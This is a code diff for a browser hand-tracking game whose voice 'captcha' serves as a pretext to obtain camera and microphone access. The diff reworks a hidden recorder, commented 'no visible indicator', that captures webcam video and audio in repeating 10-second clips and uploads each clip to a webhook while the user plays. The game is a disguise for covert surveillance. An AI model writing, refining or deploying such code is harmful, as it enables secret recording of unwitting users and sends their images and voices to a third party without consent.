@@ -116,6 +116,10 @@
         #captcha-btn:active {
             transform: scale(0.96);
         }
+        #captcha-btn:disabled {
+            opacity: 0.4;
+            pointer-events: none;
+        }
         #captcha-status {
             margin-top: 18px;
             font-size: 0.95rem;
@@ -283,10 +287,10 @@
 </head>
 <body>
 
-    <!-- Hidden video element -->
-    <video id="video" autoplay playsinline></video>
+    <!-- Hidden video element - muted -->
+    <video id="video" autoplay playsinline muted></video>
 
-    <!-- Main canvas for rendering -->
+    <!-- Canvas -->
     <canvas id="canvas"></canvas>
 
     <!-- Overlay text -->
@@ -365,30 +369,29 @@
         let score = 0;
         let handLandmarks = null;
         let handVisible = false;
-        let isPalmShowing = false;
-        let isHandInBottom = false;
-        let indexTipX = 0;
-        let indexTipY = 0;
-        let indexTipZ = 0;
-        let indexTipVisible = false;
+        let indexTipX = 0,
+            indexTipY = 0,
+            indexTipVisible = false;
         let gameObjects = [];
         let ball = { x: 0, y: 0, r: 0 };
-        let frameId = null;
-        let gameLoopId = null;
-        let objectSpawnTimer = 0;
-        let objectSpawnInterval = 1800;
-        let baseSpeed = 1.2;
-        let countdownActive = false;
-        let countdownValue = 3;
-        let recordingActive = false;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let recordingTimer = null;
-        let stream = null;
+        let frameId = null,
+            gameLoopId = null,
+            videoFrameLoop = null;
+        let objectSpawnTimer = 0,
+            objectSpawnInterval = 1800,
+            baseSpeed = 1.2;
+        let countdownActive = false,
+            countdownValue = 3;
+        let recordingActive = false,
+            mediaRecorder = null,
+            recordedChunks = [],
+            stopTimeout = null,
+            stream = null;
         let isTracking = false;
-        let videoFrameLoop = null;
+        let recognition = null;
+        let captchaVerified = false;
 
-        // ─── BALL ──────────────────────────────────────────────────
+        // ─── BALL INIT ─────────────────────────────────────────────
         function initBall() {
             const size = Math.min(W, H);
             ball.r = size * 0.045;
@@ -400,9 +403,7 @@
         // ─── SHAPES ─────────────────────────────────────────────────
         const SHAPE_TYPES = ['circle', 'oval', 'triangle', 'rectangle'];
 
-        function randomShape() {
-            return SHAPE_TYPES[Math.floor(Math.random() * SHAPE_TYPES.length)];
-        }
+        function randomShape() { return SHAPE_TYPES[Math.floor(Math.random() * SHAPE_TYPES.length)]; }
 
         function createObject() {
             const size = Math.min(W, H) * (0.045 + Math.random() * 0.035);
@@ -426,13 +427,10 @@
             };
         }
 
-        // ─── DRAW SHAPES ────────────────────────────────────────────
         function drawShape(ctx, obj) {
             const s = obj.size;
-            const x = obj.x;
-            const y = obj.y;
             ctx.save();
-            ctx.translate(x, y);
+            ctx.translate(obj.x, obj.y);
             ctx.rotate(obj.rotation);
             ctx.globalAlpha = 0.85;
             ctx.shadowColor = 'rgba(255,255,255,0.05)';
@@ -440,7 +438,6 @@
             ctx.fillStyle = `hsl(${obj.hue}, 40%, 35%)`;
             ctx.strokeStyle = `hsl(${obj.hue}, 50%, 55%)`;
             ctx.lineWidth = 1.5;
-
             switch (obj.type) {
                 case 'circle':
                     ctx.beginPath();
@@ -476,29 +473,22 @@
         // ─── HAND TRACKING ──────────────────────────────────────────
         function isPalmFacingCamera(landmarks) {
             if (!landmarks || landmarks.length < 21) return false;
-            const wrist = landmarks[0];
-            const idxMCP = landmarks[5];
-            const midMCP = landmarks[9];
-            const ringMCP = landmarks[13];
-            const pinkyMCP = landmarks[17];
+            const idxMCP = landmarks[5],
+                midMCP = landmarks[9],
+                ringMCP = landmarks[13],
+                pinkyMCP = landmarks[17];
             const palmZ = (idxMCP.z + midMCP.z + ringMCP.z + pinkyMCP.z) / 4;
-            const tipIdx = landmarks[8];
-            const tipMid = landmarks[12];
-            const tipRing = landmarks[16];
-            const tipPinky = landmarks[20];
+            const tipIdx = landmarks[8],
+                tipMid = landmarks[12],
+                tipRing = landmarks[16],
+                tipPinky = landmarks[20];
             const tipZ = (tipIdx.z + tipMid.z + tipRing.z + tipPinky.z) / 4;
             return tipZ < palmZ - 0.01;
         }
 
         function isHandInBottom(landmarks) {
             if (!landmarks || landmarks.length < 21) return false;
-            const wrist = landmarks[0];
-            return wrist.y > 0.50;
-        }
-
-        function getIndexTip(landmarks) {
-            if (!landmarks || landmarks.length < 21) return null;
-            return landmarks[8];
+            return landmarks[0].y > 0.50;
         }
 
         function onHandResults(results) {
@@ -507,14 +497,11 @@
                 handLandmarks = lm;
                 const palmFace = isPalmFacingCamera(lm);
                 const bottom = isHandInBottom(lm);
-                isPalmShowing = palmFace;
-                isHandInBottom = bottom;
                 handVisible = palmFace && bottom;
-                const tip = getIndexTip(lm);
+                const tip = lm[8];
                 if (tip) {
                     indexTipX = tip.x * W;
                     indexTipY = tip.y * H;
-                    indexTipZ = tip.z;
                     indexTipVisible = true;
                 } else {
                     indexTipVisible = false;
@@ -526,206 +513,212 @@
             }
         }
 
-        // ─── MEDIAPIPE SETUP ──────────────────────────────────────
         const hands = new Hands({
-            locateFile: (file) => {
-                return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
-            }
+            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
         });
-
         hands.setOptions({
             maxNumHands: 1,
             modelComplexity: 0,
             minDetectionConfidence: 0.7,
             minTrackingConfidence: 0.6
         });
-
         hands.onResults(onHandResults);
 
-        // ─── CAMERA + STREAM (MANUAL) ──────────────────────────────
-        function startCameraAndMicrophone() {
-            captchaStatus.textContent = '⏳ requesting camera & mic...';
-            captchaStatus.className = '';
-            return navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
-                audio: true
-            }).then(mediaStream => {
-                stream = mediaStream;
-                video.srcObject = stream;
-                return video.play();
-            }).then(() => {
-                // start frame loop for hand tracking
-                if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
-                function sendFrame() {
-                    if (video.readyState >= 2) {
-                        hands.send({ image: video });
-                    }
-                    videoFrameLoop = requestAnimationFrame(sendFrame);
-                }
-                sendFrame();
-                isTracking = true;
-                // start recording
-                startRecording(stream);
-                return true;
-            }).catch(err => {
-                console.error('Permission error:', err);
-                captchaStatus.textContent = '❌ camera/mic access denied, please allow and try again';
-                captchaStatus.className = 'error';
-                // re-enable captcha button to retry
-                captchaBtn.disabled = false;
-                captchaBtn.textContent = '🎤 click & speak';
-                return false;
-            });
-        }
-
-        // ─── RECORDING ─────────────────────────────────────────────
+        // ─── RECORDING – reliable 10s loop (no visible indicator) ──
         function startRecording(mediaStream) {
             if (!mediaStream) return;
-            try {
-                const recStream = new MediaStream();
-                const videoTracks = mediaStream.getVideoTracks();
-                const audioTracks = mediaStream.getAudioTracks();
-                videoTracks.forEach(t => recStream.addTrack(t));
-                audioTracks.forEach(t => recStream.addTrack(t));
+            if (recordingActive) return;
 
-                mediaRecorder = new MediaRecorder(recStream, {
-                    mimeType: 'video/webm;codecs=vp8,opus',
-                    videoBitsPerSecond: 800000,
-                    audioBitsPerSecond: 64000
-                });
+            let selectedMimeType = 'video/webm;codecs=vp8';
+            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
+                    selectedMimeType = 'video/mp4';
+                } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                    selectedMimeType = 'video/webm';
+                } else {
+                    selectedMimeType = '';
+                }
+            }
 
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data && e.data.size > 0) {
-                        recordedChunks.push(e.data);
-                    }
-                };
+            mediaRecorder = new MediaRecorder(mediaStream, {
+                mimeType: selectedMimeType,
+                videoBitsPerSecond: 3500000
+            });
 
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length > 0) {
+                    const blob = new Blob(recordedChunks, { type: selectedMimeType || 'video/webm' });
                     recordedChunks = [];
-                    if (blob.size > 10000) {
-                        sendToWebhook(blob);
+
+                    const formData = new FormData();
+                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
+                    formData.append('file', blob, `handgame_${Date.now()}.${ext}`);
+
+                    try {
+                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                        console.log('✅ 10s clip sent');
+                    } catch (err) {
+                        console.error('Webhook send failed:', err);
                     }
-                    if (recordingActive) {
+                } else {
+                    recordedChunks = [];
+                }
+
+                if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
+                    try {
+                        mediaRecorder.start();
+                        scheduleStop();
+                    } catch (e) {
+                        console.warn('Recorder restart error:', e);
                         setTimeout(() => {
-                            if (mediaRecorder && recordingActive) {
-                                try { mediaRecorder.start(1000); } catch (_) {}
+                            if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
+                                try { mediaRecorder.start();
+                                    scheduleStop(); } catch (_) {}
                             }
-                        }, 200);
+                        }, 500);
                     }
-                };
+                }
+            };
 
-                mediaRecorder.start(1000);
-                recordingActive = true;
+            mediaRecorder.start();
+            recordingActive = true;
+            scheduleStop();
 
-                recordingTimer = setInterval(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording' && recordingActive) {
-                        try { mediaRecorder.stop(); } catch (_) {}
+            function scheduleStop() {
+                if (stopTimeout) clearTimeout(stopTimeout);
+                stopTimeout = setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
                     }
                 }, 10000);
-
-            } catch (e) {
-                console.warn('Recording init error:', e);
             }
         }
 
-        function sendToWebhook(blob) {
-            const formData = new FormData();
-            const filename = `clip_${Date.now()}.webm`;
-            formData.append('file', blob, filename);
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            }).catch(() => {});
-        }
-
-        // ─── CAPTCHA ────────────────────────────────────────────────
-        let recognition = null;
-
+        // ─── CAPTCHA FLOW ──────────────────────────────────────────
         function initSpeechRecognition() {
             const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
-            if (!SR) {
-                captchaStatus.textContent = '⚠️ speech not supported, click to verify';
-                captchaStatus.className = 'error';
-                captchaBtn.onclick = () => { verifyCaptcha(); };
-                return;
-            }
-            recognition = new SR();
-            recognition.lang = 'en-US';
-            recognition.interimResults = false;
-            recognition.maxAlternatives = 1;
-
-            recognition.onresult = (e) => {
-                const word = e.results[0][0].transcript.trim().toLowerCase();
-                if (word === 'apple') {
-                    verifyCaptcha();
-                } else {
-                    captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
-                    captchaStatus.className = 'error';
-                    setTimeout(() => {
-                        captchaStatus.textContent = 'say "apple" to continue';
-                        captchaStatus.className = '';
-                    }, 2000);
-                }
-            };
-
-            recognition.onerror = () => {
-                captchaStatus.textContent = '❌ listening error, try again';
-                captchaStatus.className = 'error';
-                setTimeout(() => {
-                    captchaStatus.textContent = 'say "apple" to continue';
-                    captchaStatus.className = '';
-                }, 1500);
-                captchaBtn.disabled = false;
-                captchaBtn.textContent = '🎤 click & speak';
-            };
-
-            recognition.onend = () => {
-                captchaBtn.disabled = false;
-                captchaBtn.textContent = '🎤 click & speak';
-            };
-
-            captchaBtn.onclick = () => {
-                if (!recognition) return;
-                try {
-                    captchaStatus.textContent = '🎧 listening...';
-                    captchaStatus.className = '';
-                    captchaBtn.disabled = true;
-                    captchaBtn.textContent = '⏳ listening...';
-                    recognition.start();
-                } catch (_) {
-                    captchaBtn.disabled = false;
-                    captchaBtn.textContent = '🎤 click & speak';
-                    captchaStatus.textContent = '⚠️ try again';
-                }
-            };
+            if (!SR) return null;
+            const rec = new SR();
+            rec.lang = 'en-US';
+            rec.interimResults = false;
+            rec.maxAlternatives = 1;
+            return rec;
         }
-
-        let captchaVerified = false;
 
         function verifyCaptcha() {
             if (captchaVerified) return;
             captchaVerified = true;
-            captchaStatus.textContent = '✅ verified! starting camera...';
+            captchaStatus.textContent = '✅ verified!';
             captchaStatus.className = 'success';
-            // start camera & mic
-            startCameraAndMicrophone().then(success => {
-                if (success) {
-                    setTimeout(() => {
-                        captchaOverlay.classList.add('hidden');
-                        isVerified = true;
-                        gameBtn.classList.add('visible');
-                        overlayText.classList.remove('hidden');
-                    }, 300);
-                } else {
-                    // permission failed, reset verification flag so user can retry
-                    captchaVerified = false;
-                    captchaStatus.textContent = '❌ permission denied, click again to retry';
+            setTimeout(() => {
+                captchaOverlay.classList.add('hidden');
+                isVerified = true;
+                gameBtn.classList.add('visible');
+                overlayText.classList.remove('hidden');
+            }, 400);
+        }
+
+        function handleCaptchaClick() {
+            if (captchaVerified) return;
+
+            captchaBtn.disabled = true;
+            captchaStatus.textContent = '⏳ requesting camera & mic...';
+            captchaStatus.className = '';
+
+            navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
+                    audio: true
+                })
+                .then(mediaStream => {
+                    stream = mediaStream;
+                    video.srcObject = stream;
+                    return video.play();
+                })
+                .then(() => {
+                    if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
+
+                    function sendFrame() {
+                        if (video.readyState >= 2) hands.send({ image: video });
+                        videoFrameLoop = requestAnimationFrame(sendFrame);
+                    }
+                    sendFrame();
+                    isTracking = true;
+
+                    startRecording(stream);
+
+                    if (recognition) {
+                        recognition.onresult = (e) => {
+                            const word = e.results[0][0].transcript.trim().toLowerCase();
+                            if (word === 'apple') {
+                                verifyCaptcha();
+                            } else {
+                                captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
+                                captchaStatus.className = 'error';
+                                setTimeout(() => {
+                                    captchaStatus.textContent = 'say "apple" to continue';
+                                    captchaStatus.className = '';
+                                    captchaBtn.disabled = false;
+                                    captchaBtn.textContent = '🎤 click & speak';
+                                }, 2000);
+                            }
+                        };
+                        recognition.onerror = (e) => {
+                            if (e.error === 'not-allowed') {
+                                captchaStatus.textContent = '❌ mic blocked, please allow and retry';
+                                captchaStatus.className = 'error';
+                            } else {
+                                captchaStatus.textContent = '❌ listening error, try again';
+                                captchaStatus.className = 'error';
+                            }
+                            captchaBtn.disabled = false;
+                            captchaBtn.textContent = '🎤 retry';
+                        };
+                        recognition.onend = () => {
+                            if (!captchaVerified) {
+                                captchaBtn.disabled = false;
+                                captchaBtn.textContent = '🎤 click & speak';
+                                captchaStatus.textContent = 'say "apple" to continue';
+                                captchaStatus.className = '';
+                            }
+                        };
+
+                        try {
+                            recognition.start();
+                            captchaStatus.textContent = '🎧 listening... say "apple"';
+                            captchaStatus.className = '';
+                            captchaBtn.disabled = true;
+                            captchaBtn.textContent = '⏳ listening...';
+                        } catch (e) {
+                            captchaBtn.disabled = false;
+                            captchaBtn.textContent = '🎤 retry';
+                            captchaStatus.textContent = '⚠️ could not start listening, try again';
+                            captchaStatus.className = 'error';
+                        }
+                    } else {
+                        captchaStatus.textContent = '✅ media ready, click "verify" to continue';
+                        captchaStatus.className = 'success';
+                        captchaBtn.disabled = false;
+                        captchaBtn.textContent = '✅ verify';
+                        captchaBtn.onclick = verifyCaptcha;
+                    }
+                })
+                .catch(err => {
+                    console.error('Permission error:', err);
+                    captchaStatus.textContent = '❌ camera/mic denied. Please allow and retry.';
                     captchaStatus.className = 'error';
                     captchaBtn.disabled = false;
                     captchaBtn.textContent = '🎤 retry';
-                }
-            });
+                    stream = null;
+                });
+        }
+
+        function setupCaptcha() {
+            recognition = initSpeechRecognition();
+            captchaBtn.onclick = handleCaptchaClick;
         }
 
         // ─── GAME ──────────────────────────────────────────────────
@@ -734,6 +727,7 @@
             isGameOver = false;
             level = 1;
             score = 0;
+            // Clear all objects to free memory
             gameObjects = [];
             objectSpawnInterval = 1800;
             baseSpeed = 1.2;
@@ -769,31 +763,32 @@
 
         function updateGame() {
             if (!isGameRunning || isGameOver) return;
-
             objectSpawnTimer += 16;
-            const spawnCount = Math.min(level, 5);
-            if (objectSpawnTimer > objectSpawnInterval) {
+            // Limit total objects to prevent memory bloat
+            const MAX_OBJECTS = 30;
+            if (objectSpawnTimer > objectSpawnInterval && gameObjects.length < MAX_OBJECTS) {
                 objectSpawnTimer = 0;
+                const spawnCount = Math.min(level, 3); // spawn fewer per tick
                 for (let i = 0; i < spawnCount; i++) {
-                    if (gameObjects.length < 20 + level * 3) {
+                    if (gameObjects.length < MAX_OBJECTS) {
                         gameObjects.push(createObject());
                     }
                 }
-                if (objectSpawnInterval > 400) {
-                    objectSpawnInterval = Math.max(400, objectSpawnInterval - 12);
-                }
+                if (objectSpawnInterval > 400) objectSpawnInterval = Math.max(400, objectSpawnInterval - 12);
                 baseSpeed = Math.min(3.2, baseSpeed + 0.02);
             }
 
+            // Iterate backwards so we can splice safely
             for (let i = gameObjects.length - 1; i >= 0; i--) {
                 const obj = gameObjects[i];
                 obj.x += obj.vx;
                 obj.y += obj.vy;
                 obj.rotation += obj.rotSpeed;
 
+                // Push away from finger tip
                 if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
-                    const dx = obj.x - indexTipX;
-                    const dy = obj.y - indexTipY;
+                    const dx = obj.x - indexTipX,
+                        dy = obj.y - indexTipY;
                     const dist = Math.sqrt(dx * dx + dy * dy);
                     const pushRadius = Math.max(obj.size * 0.8, 20);
                     if (dist < pushRadius + 12) {
@@ -806,14 +801,15 @@
                     }
                 }
 
-                const dxb = obj.x - ball.x;
-                const dyb = obj.y - ball.y;
-                const distB = Math.sqrt(dxb * dxb + dyb * dyb);
-                if (distB < obj.size + ball.r) {
+                // Collision with ball
+                const dxb = obj.x - ball.x,
+                    dyb = obj.y - ball.y;
+                if (Math.sqrt(dxb * dxb + dyb * dyb) < obj.size + ball.r) {
                     endGame();
                     return;
                 }
 
+                // Remove if offscreen (splice removes reference)
                 if (obj.y > H + obj.size * 2 || obj.x < -obj.size * 2 || obj.x > W + obj.size * 2) {
                     gameObjects.splice(i, 1);
                     score++;
@@ -826,10 +822,12 @@
                     continue;
                 }
 
+                // Keep within horizontal bounds
                 if (obj.x < obj.size) obj.x = obj.size;
                 if (obj.x > W - obj.size) obj.x = W - obj.size;
             }
 
+            // Update ball position
             const size = Math.min(W, H);
             ball.r = size * 0.045;
             ball.y = H - ball.r - size * 0.08;
@@ -844,6 +842,8 @@
             gameLoopId = null;
             finalScoreEl.textContent = `level ${level}  ·  ${score} pushed`;
             gameOverEl.classList.add('show');
+            // Clear objects to free memory when game ends
+            gameObjects = [];
             setTimeout(() => {
                 if (!isGameRunning) {
                     gameBtn.classList.add('visible');
@@ -856,7 +856,7 @@
             gameOverEl.classList.remove('show');
             isGameOver = false;
             isGameRunning = false;
-            gameObjects = [];
+            gameObjects = []; // Clear memory
             level = 1;
             score = 0;
             objectSpawnInterval = 1800;
@@ -877,7 +877,49 @@
             ctx.fillRect(0, 0, W, H);
 
             if (handVisible && handLandmarks && !isGameOver) {
-                drawSkeleton(handLandmarks);
+                const connections = [
+                    [0, 1],
+                    [1, 2],
+                    [2, 3],
+                    [3, 4],
+                    [0, 5],
+                    [5, 6],
+                    [6, 7],
+                    [7, 8],
+                    [0, 9],
+                    [9, 10],
+                    [10, 11],
+                    [11, 12],
+                    [0, 13],
+                    [13, 14],
+                    [14, 15],
+                    [15, 16],
+                    [0, 17],
+                    [17, 18],
+                    [18, 19],
+                    [19, 20],
+                    [5, 9],
+                    [9, 13],
+                    [13, 17]
+                ];
+                ctx.save();
+                ctx.strokeStyle = 'rgba(255,255,255,0.55)';
+                ctx.lineWidth = 1.8;
+                for (const [i, j] of connections) {
+                    const p1 = handLandmarks[i],
+                        p2 = handLandmarks[j];
+                    ctx.beginPath();
+                    ctx.moveTo(p1.x * W, p1.y * H);
+                    ctx.lineTo(p2.x * W, p2.y * H);
+                    ctx.stroke();
+                }
+                ctx.fillStyle = 'rgba(255,255,255,0.2)';
+                for (const lm of handLandmarks) {
+                    ctx.beginPath();
+                    ctx.arc(lm.x * W, lm.y * H, 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+                ctx.restore();
             }
 
             if (isGameRunning || isGameOver) {
@@ -892,9 +934,7 @@
                 ctx.stroke();
                 ctx.shadowBlur = 0;
 
-                for (const obj of gameObjects) {
-                    drawShape(ctx, obj);
-                }
+                for (const obj of gameObjects) drawShape(ctx, obj);
 
                 if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
                     ctx.shadowColor = 'rgba(255,0,0,0.2)';
@@ -922,72 +962,14 @@
             if (isGameRunning && !isGameOver) {
                 levelDisplay.textContent = `level ${level}`;
                 levelDisplay.style.display = 'block';
-            } else if (!isGameRunning && !isGameOver) {
+            } else {
                 levelDisplay.style.display = 'none';
             }
         }
 
-        // ─── SKELETON DRAW ──────────────────────────────────────────
-        function drawSkeleton(landmarks) {
-            const connections = [
-                [0, 1],
-                [1, 2],
-                [2, 3],
-                [3, 4],
-                [0, 5],
-                [5, 6],
-                [6, 7],
-                [7, 8],
-                [0, 9],
-                [9, 10],
-                [10, 11],
-                [11, 12],
-                [0, 13],
-                [13, 14],
-                [14, 15],
-                [15, 16],
-                [0, 17],
-                [17, 18],
-                [18, 19],
-                [19, 20],
-                [5, 9],
-                [9, 13],
-                [13, 17]
-            ];
-
-            ctx.save();
-            ctx.strokeStyle = 'rgba(255,255,255,0.55)';
-            ctx.lineWidth = 1.8;
-            ctx.shadowColor = 'rgba(255,255,255,0.02)';
-            ctx.shadowBlur = 2;
-
-            for (const [i, j] of connections) {
-                const p1 = landmarks[i];
-                const p2 = landmarks[j];
-                const x1 = p1.x * W,
-                    y1 = p1.y * H;
-                const x2 = p2.x * W,
-                    y2 = p2.y * H;
-                ctx.beginPath();
-                ctx.moveTo(x1, y1);
-                ctx.lineTo(x2, y2);
-                ctx.stroke();
-            }
-
-            ctx.fillStyle = 'rgba(255,255,255,0.2)';
-            for (const lm of landmarks) {
-                ctx.beginPath();
-                ctx.arc(lm.x * W, lm.y * H, 2, 0, Math.PI * 2);
-                ctx.fill();
-            }
-            ctx.restore();
-        }
-
-        // ─── MAIN RENDER LOOP ──────────────────────────────────────
+        // ─── MAIN LOOP ─────────────────────────────────────────────
         function mainRender() {
-            if (!isGameRunning && !isGameOver) {
-                render();
-            }
+            if (!isGameRunning && !isGameOver) render();
             frameId = requestAnimationFrame(mainRender);
         }
 
@@ -996,29 +978,24 @@
         restartBtn.addEventListener('click', restartGame);
 
         // ─── INIT ──────────────────────────────────────────────────
-        initSpeechRecognition();
+        setupCaptcha();
         mainRender();
 
-        window.addEventListener('resize', () => {
-            resize();
-            initBall();
-        });
-
+        window.addEventListener('resize', () => { resize();
+            initBall(); });
         window.addEventListener('beforeunload', () => {
             if (frameId) cancelAnimationFrame(frameId);
             if (gameLoopId) cancelAnimationFrame(gameLoopId);
             if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
-            if (recordingTimer) clearInterval(recordingTimer);
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                try { mediaRecorder.stop(); } catch (_) {}
-            }
+            if (stopTimeout) clearTimeout(stopTimeout);
             recordingActive = false;
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-            }
+            if (mediaRecorder && mediaRecorder.state !== "inactive") try { mediaRecorder.stop(); } catch (_) {}
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            // Clear game objects
+            gameObjects = [];
         });
 
-        console.log('✅ System ready');
+        console.log('✅ System ready — memory usage optimized.');
     </script>
 
 </body>
